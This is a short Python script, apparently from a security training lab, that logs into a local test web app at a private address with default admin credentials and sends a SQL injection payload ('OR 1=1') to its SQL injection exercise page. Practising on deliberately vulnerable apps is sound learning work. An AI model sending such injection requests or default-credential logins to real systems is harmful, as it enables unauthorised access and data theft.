import requests


payload = {'username': 'admin', 'password': 'password', 'submit': 'submit'}
with requests.Session() as session:
    post = session.post('http://192.168.56.101/login.php', data=payload)
    #print post.content
    #print "\n", url, "\n"
    #request = session.get("http://192.168.56.101/index.php")
    #print request.text
    r = session.get('http://192.168.56.101/vulnerabilities/sqli/?id=%27SELECT+%2A+FROM+Users+WHERE+UserId+%3D+105+OR+1%3D1%3B%27&Submit=Submit')
    print r.text
